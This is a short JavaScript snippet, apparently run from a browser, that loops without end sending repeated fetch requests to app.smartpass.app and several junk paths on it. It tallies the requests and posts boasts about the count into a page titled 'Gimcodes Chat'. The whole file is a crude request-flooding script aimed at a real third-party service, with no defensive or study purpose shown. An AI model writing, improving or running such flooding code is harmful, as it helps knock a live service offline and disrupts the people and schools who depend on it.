async function fetchPasses() {
    await fetch("https://app.smartpass.app/main/passes").then(res =>{
        res.text().then(async textt => {
            console.log(textt)
            var x = 0
            while (true) {
                x+=8
                fetch("https://app.smartpass.app/main/passes");
                fetch("https://app.smartpass.app/main");
                fetch("https://app.smartpass.app/balls");
                fetch("https://app.smartpass.app/balls1");
                fetch("https://app.smartpass.app/balls2");
                fetch("https://app.smartpass.app/balls3");
                await fetch("https://app.smartpass.app/");
                if (x>15000 && document.title == 'Gimcodes Chat'){
                    sendMessage('I have sent ' + x + ' requests to smartpass');
                    x = 0
                }
                // Add a delay here before the next fetch
            }
        })
    });

}

fetchPasses(); // Start the fetch loop

